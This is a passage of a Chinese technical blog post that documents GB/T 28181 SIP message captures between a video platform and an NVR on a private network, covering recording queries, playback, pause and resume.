class="hljs-number">192.168.6.71:5060</span>&gt;;tag=<span class="hljs-number">1218760507</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">3546884413</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> MESSAGE<br><span class="hljs-attribute">User</span>-Agent: SIP UAS V<span class="hljs-number">3.0.0.675</span>168<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><h4 id="4-6-FI指令解释"><a href="#4-6-FI指令解释" class="headerlink" title="4.6 FI指令解释"></a>4.6 <code>FI</code>指令解释</h4><p>摘自GB/T 28181-2016，以下为图片，不可复制</p><img src="/2024/05/newpost-56/image-20240517151307986.png" class="" title="image-20240517151307986"><img src="/2024/05/newpost-56/image-20240517151435540.png" class="" title="image-20240517151435540"><h4 id="4-7-其他指令解析"><a href="#4-7-其他指令解析" class="headerlink" title="4.7 其他指令解析"></a>4.7 其他指令解析</h4><p>摘自GB/T 28181-2016，以下为图片，不可复制</p><img src="/2024/05/newpost-56/image-20240517152147795.png" class="" title="image-20240517152147795"><img src="/2024/05/newpost-56/image-20240517152513155.png" class="" title="image-20240517152513155"><img src="/2024/05/newpost-56/image-20240517152536092.png" class="" title="image-20240517152536092"><h3 id="5-录像相关"><a href="#5-录像相关" class="headerlink" title="5. 录像相关"></a>5. 录像相关</h3><p>前面的客户端不支持录像，故客户端更改如下</p><p>地址：192.168.6.60</p><p>端口：5060</p><p>编码：34020000001110000001</p><p>通道编号：34020000001310000001</p><h4 id="5-1-查询录像"><a href="#5-1-查询录像" class="headerlink" title="5.1 查询录像"></a>5.1 查询录像</h4><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MESSAGE</span> sip:<span class="hljs-number">34020000001110000001</span>@<span class="hljs-number">192.168.6.60:5060</span> SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport;branch=z9hG4bK1014846848<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">1030020984</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001110000001</span>@<span class="hljs-number">192.168.6.60:5060</span>&gt;<br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">455132672</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> MESSAGE<br><span class="hljs-attribute">Content</span>-Type: application/MANSCDP+xml<br><span class="hljs-attribute">Max</span>-Forwards: <span class="hljs-number">70</span><br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Date</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">17</span>T15:<span class="hljs-number">49</span>:<span class="hljs-number">01</span>.<span class="hljs-number">451</span><br><span class="hljs-attribute">Content</span>-Length:   <span class="hljs-number">324</span><br><br><span class="hljs-section">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-section">&lt;Query&gt;</span><br><span class="hljs-section">&lt;CmdType&gt;</span><span class="hljs-attribute">RecordInfo</span>&lt;/CmdType&gt;<br><span class="hljs-section">&lt;SN&gt;</span><span class="hljs-attribute">18</span>&lt;/SN&gt;<br><span class="hljs-section">&lt;DeviceID&gt;</span><span class="hljs-attribute">34020000001310000001</span>&lt;/DeviceID&gt;<br><span class="hljs-section">&lt;StartTime&gt;</span><span class="hljs-attribute">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">01</span>T00:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>&lt;/StartTime&gt;<br><span class="hljs-section">&lt;EndTime&gt;</span><span class="hljs-attribute">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">04</span>T15:<span class="hljs-number">41</span>:<span class="hljs-number">00</span>&lt;/EndTime&gt;<br><span class="hljs-section">&lt;FilePath&gt;</span><span class="hljs-section">&lt;/FilePath&gt;</span><br><span class="hljs-section">&lt;Address&gt;</span><span class="hljs-section">&lt;/Address&gt;</span><br><span class="hljs-section">&lt;Secrecy&gt;</span><span class="hljs-attribute">0</span>&lt;/Secrecy&gt;<br><span class="hljs-section">&lt;Type&gt;</span><span class="hljs-attribute">all</span>&lt;/Type&gt;<br><span class="hljs-section">&lt;RecorderID&gt;</span><span class="hljs-section">&lt;/RecorderID&gt;</span><br><span class="hljs-section">&lt;/Query&gt;</span><br><br></code></pre></td></tr></table></figure><p>客户端-&gt;服务端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport=<span class="hljs-number">5062</span>;branch=z9hG4bK1014846848<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">1030020984</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001110000001</span>@<span class="hljs-number">192.168.6.60:5060</span>&gt;;tag=<span class="hljs-number">134054297</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">455132672</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> MESSAGE<br><span class="hljs-attribute">User</span>-Agent: Embedded Net DVR/NVR/DVS<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">MESSAGE</span> sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">3402000000</span> SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.60:5060</span>;rport;branch=z9hG4bK1849801968<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000001110000001</span>@<span class="hljs-number">3402000000</span>&gt;;tag=<span class="hljs-number">992677514</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">3402000000</span>&gt;<br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">2058944946</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> MESSAGE<br><span class="hljs-attribute">Content</span>-Type: Application/MANSCDP+xml<br><span class="hljs-attribute">Max</span>-Forwards: <span class="hljs-number">70</span><br><span class="hljs-attribute">User</span>-Agent: Embedded Net DVR/NVR/DVS<br><span class="hljs-attribute">Content</span>-Length:   <span class="hljs-number">777</span><br><br><span class="hljs-section">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;gb2312&quot;</span>?&gt;</span><br><span class="hljs-section">&lt;Response&gt;</span><br><span class="hljs-section">&lt;CmdType&gt;</span><span class="hljs-attribute">RecordInfo</span>&lt;/CmdType&gt;<br><span class="hljs-section">&lt;SN&gt;</span><span class="hljs-attribute">18</span>&lt;/SN&gt;<br><span class="hljs-section">&lt;DeviceID&gt;</span><span class="hljs-attribute">34020000001310000001</span>&lt;/DeviceID&gt;<br><span class="hljs-section">&lt;Name&gt;</span><span class="hljs-attribute">IPCamera</span> <span class="hljs-number">01</span>&lt;/Name&gt;<br><span class="hljs-section">&lt;SumNum&gt;</span><span class="hljs-attribute">2</span>&lt;/SumNum&gt;<br><span class="hljs-section">&lt;RecordList Num=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><br><span class="hljs-section">&lt;Item&gt;</span><br><span class="hljs-section">&lt;DeviceID&gt;</span><span class="hljs-attribute">34020000001310000001</span>&lt;/DeviceID&gt;<br><span class="hljs-section">&lt;Name&gt;</span><span class="hljs-attribute">IPCamera</span> <span class="hljs-number">01</span>&lt;/Name&gt;<br><span class="hljs-section">&lt;FilePath&gt;</span><span class="hljs-attribute">1714804996_1714806986</span>&lt;/FilePath&gt;<br><span class="hljs-section">&lt;Address&gt;</span><span class="hljs-attribute">Address</span> <span class="hljs-number">1</span>&lt;/Address&gt;<br><span class="hljs-section">&lt;StartTime&gt;</span><span class="hljs-attribute">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">04</span>T14:<span class="hljs-number">43</span>:<span class="hljs-number">16</span>&lt;/StartTime&gt;<br><span class="hljs-section">&lt;EndTime&gt;</span><span class="hljs-attribute">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">04</span>T15:<span class="hljs-number">16</span>:<span class="hljs-number">26</span>&lt;/EndTime&gt;<br><span class="hljs-section">&lt;Secrecy&gt;</span><span class="hljs-attribute">0</span>&lt;/Secrecy&gt;<br><span class="hljs-section">&lt;Type&gt;</span><span class="hljs-attribute">time</span>&lt;/Type&gt;<br><span class="hljs-section">&lt;/Item&gt;</span><br><span class="hljs-section">&lt;Item&gt;</span><br><span class="hljs-section">&lt;DeviceID&gt;</span><span class="hljs-attribute">34020000001310000001</span>&lt;/DeviceID&gt;<br><span class="hljs-section">&lt;Name&gt;</span><span class="hljs-attribute">IPCamera</span> <span class="hljs-number">01</span>&lt;/Name&gt;<br><span class="hljs-section">&lt;FilePath&gt;</span><span class="hljs-attribute">1714806986_1714808977</span>&lt;/FilePath&gt;<br><span class="hljs-section">&lt;Address&gt;</span><span class="hljs-attribute">Address</span> <span class="hljs-number">1</span>&lt;/Address&gt;<br><span class="hljs-section">&lt;StartTime&gt;</span><span class="hljs-attribute">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">04</span>T15:<span class="hljs-number">16</span>:<span class="hljs-number">26</span>&lt;/StartTime&gt;<br><span class="hljs-section">&lt;EndTime&gt;</span><span class="hljs-attribute">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">04</span>T15:<span class="hljs-number">49</span>:<span class="hljs-number">37</span>&lt;/EndTime&gt;<br><span class="hljs-section">&lt;Secrecy&gt;</span><span class="hljs-attribute">0</span>&lt;/Secrecy&gt;<br><span class="hljs-section">&lt;Type&gt;</span><span class="hljs-attribute">time</span>&lt;/Type&gt;<br><span class="hljs-section">&lt;/Item&gt;</span><br><span class="hljs-section">&lt;/RecordList&gt;</span><br><span class="hljs-section">&lt;/Response&gt;</span><br><br></code></pre></td></tr></table></figure><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.60:5060</span>;rport=<span class="hljs-number">5060</span>;branch=z9hG4bK1849801968<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000001110000001</span>@<span class="hljs-number">3402000000</span>&gt;;tag=<span class="hljs-number">992677514</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">3402000000</span>&gt;;tag=<span class="hljs-number">2312042141</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">2058944946</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> MESSAGE<br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><h4 id="5-2-播放录像"><a href="#5-2-播放录像" class="headerlink" title="5.2 播放录像"></a>5.2 播放录像</h4><h5 id="5-2-1-播放"><a href="#5-2-1-播放" class="headerlink" title="5.2.1 播放"></a>5.2.1 播放</h5><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">INVITE</span> sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span> SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport;branch=z9hG4bK925030664<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">1990264104</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span>&gt;<br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">2293065782</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> INVITE<br><span class="hljs-attribute">Contact</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;<br><span class="hljs-attribute">Content</span>-Type: application/sdp<br><span class="hljs-attribute">Max</span>-Forwards: <span class="hljs-number">70</span><br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Date</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">17</span>T15:<span class="hljs-number">52</span>:<span class="hljs-number">21</span>.<span class="hljs-number">529</span><br><span class="hljs-attribute">Subject</span>: <span class="hljs-number">34020000001110000001</span>:<span class="hljs-number">10000000000000000041</span>,<span class="hljs-number">34020000002000000010</span>:<span class="hljs-number">2000</span><br><span class="hljs-attribute">Content</span>-Length:   <span class="hljs-number">272</span><br><br><span class="hljs-attribute">v</span>=<span class="hljs-number">0</span><br><span class="hljs-attribute">o</span>=<span class="hljs-number">34020000002000000010</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> IN IP4 <span class="hljs-number">192.168.6.106</span><br><span class="hljs-attribute">s</span>=Playback<br><span class="hljs-attribute">u</span>=<span class="hljs-number">34020000001310000001</span>:<span class="hljs-number">3</span><br><span class="hljs-attribute">c</span>=IN IP4 <span class="hljs-number">192.168.6.106</span><br><span class="hljs-attribute">t</span>=<span class="hljs-number">1714804996</span> <span class="hljs-number">1714806986</span><br><span class="hljs-attribute">m</span>=video <span class="hljs-number">45056</span> RTP/AVP <span class="hljs-number">96</span> <span class="hljs-number">98</span> <span class="hljs-number">97</span><br><span class="hljs-attribute">a</span>=recvonly<br><span class="hljs-attribute">a</span>=rtpmap:<span class="hljs-number">96</span> PS/<span class="hljs-number">90000</span><br><span class="hljs-attribute">a</span>=rtpmap:<span class="hljs-number">98</span> H264/<span class="hljs-number">90000</span><br><span class="hljs-attribute">a</span>=rtpmap:<span class="hljs-number">97</span> MPEG4/<span class="hljs-number">90000</span><br><span class="hljs-attribute">y</span>=<span class="hljs-number">0000002000</span><br><span class="hljs-attribute">f</span>=<br></code></pre></td></tr></table></figure><p>客户端-&gt;服务端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport=<span class="hljs-number">5062</span>;branch=z9hG4bK925030664<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">1990264104</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span>&gt;;tag=<span class="hljs-number">2049052006</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">2293065782</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> INVITE<br><span class="hljs-attribute">Contact</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span>&gt;<br><span class="hljs-attribute">Content</span>-Type: application/SDP<br><span class="hljs-attribute">User</span>-Agent: Embedded Net DVR/NVR/DVS<br><span class="hljs-attribute">Content</span>-Length:   <span class="hljs-number">282</span><br><br><span class="hljs-attribute">v</span>=<span class="hljs-number">0</span><br><span class="hljs-attribute">o</span>=<span class="hljs-number">34020000001110000001</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> IN IP4 <span class="hljs-number">192.168.6.60</span><br><span class="hljs-attribute">s</span>=Network Video Recorder<br><span class="hljs-attribute">c</span>=IN IP4 <span class="hljs-number">192.168.6.60</span><br><span class="hljs-attribute">t</span>=<span class="hljs-number">1714833796</span> <span class="hljs-number">1714835786</span><br><span class="hljs-attribute">m</span>=video <span class="hljs-number">62000</span> RTP/AVP <span class="hljs-number">96</span><br><span class="hljs-attribute">a</span>=sendonly<br><span class="hljs-attribute">a</span>=rtpmap:<span class="hljs-number">96</span> PS/<span class="hljs-number">90000</span><br><span class="hljs-attribute">a</span>=username:<span class="hljs-number">34020000001110000001</span><br><span class="hljs-attribute">a</span>=password:zzgd1234<br><span class="hljs-attribute">a</span>=filesize:<span class="hljs-number">2124794308</span><br><span class="hljs-attribute">y</span>=<span class="hljs-number">0000002000</span><br><span class="hljs-attribute">f</span>=<br><br></code></pre></td></tr></table></figure><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ACK</span> sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span> SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport;branch=z9hG4bK1836836056<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">1990264104</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span>&gt;;tag=<span class="hljs-number">2049052006</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">2293065782</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span> ACK<br><span class="hljs-attribute">Contact</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;<br><span class="hljs-attribute">Max</span>-Forwards: <span class="hljs-number">70</span><br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">0</span><br><br><br></code></pre></td></tr></table></figure><p>然后是推流播放</p><h5 id="5-2-2-暂停播放"><a href="#5-2-2-暂停播放" class="headerlink" title="5.2.2 暂停播放"></a>5.2.2 暂停播放</h5><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">INFO</span> sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span> SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport;branch=z9hG4bK1187559455<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">1990264104</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span>&gt;;tag=<span class="hljs-number">2049052006</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">2293065782</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">21</span> INFO<br><span class="hljs-attribute">Contact</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;<br><span class="hljs-attribute">Content</span>-Type: application/RTSP<br><span class="hljs-attribute">Max</span>-Forwards: <span class="hljs-number">70</span><br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Date</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">17</span>T15:<span class="hljs-number">52</span>:<span class="hljs-number">29</span>.<span class="hljs-number">076</span><br><span class="hljs-attribute">Content</span>-Length:    <span class="hljs-number">40</span><br><br><span class="hljs-attribute">PAUSE</span> RTSP/<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span><br><span class="hljs-attribute">PauseTime</span>: <span class="hljs-number">0</span><br><br></code></pre></td></tr></table></figure><p>客户端-&gt;服务端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SIP</span>/<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport=<span class="hljs-number">5062</span>;branch=z9hG4bK1187559455<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">1990264104</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span>&gt;;tag=<span class="hljs-number">2049052006</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">2293065782</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">21</span> INFO<br><span class="hljs-attribute">Contact</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span>&gt;<br><span class="hljs-attribute">Content</span>-Type: Application/RTSP<br><span class="hljs-attribute">User</span>-Agent: Embedded Net DVR/NVR/DVS<br><span class="hljs-attribute">Content</span>-Length:    <span class="hljs-number">66</span><br><br><span class="hljs-attribute">RTSP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">0</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">20</span><br><span class="hljs-attribute">RTP</span>-Info: seq=<span class="hljs-number">9810092</span>;rtptime=<span class="hljs-number">3450012</span><br><br></code></pre></td></tr></table></figure><h5 id="5-2-3-继续播放"><a href="#5-2-3-继续播放" class="headerlink" title="5.2.3 继续播放"></a>5.2.3 继续播放</h5><p>服务端-&gt;客户端</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">INFO</span> sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span> SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Via</span>: SIP/<span class="hljs-number">2</span>.<span class="hljs-number">0</span>/UDP <span class="hljs-number">192.168.6.106:5062</span>;rport;branch=z9hG4bK498785409<br><span class="hljs-attribute">From</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;;tag=<span class="hljs-number">1990264104</span><br><span class="hljs-attribute">To</span>: &lt;sip:<span class="hljs-number">34020000001310000001</span>@<span class="hljs-number">192.168.6.60:5060</span>&gt;;tag=<span class="hljs-number">2049052006</span><br><span class="hljs-attribute">Call</span>-ID: <span class="hljs-number">2293065782</span><br><span class="hljs-attribute">CSeq</span>: <span class="hljs-number">22</span> INFO<br><span class="hljs-attribute">Contact</span>: &lt;sip:<span class="hljs-number">34020000002000000010</span>@<span class="hljs-number">192.168.6.106:5062</span>&gt;<br><span class="hljs-attribute">Content</span>-Type: application/RTSP<br><span class="hljs-attribute">Max</span>-Forwards: <span class="hljs-number">70</span><br><span class="hljs-attribute">User</span>-Agent: eXosip/<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Date</span>: <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span 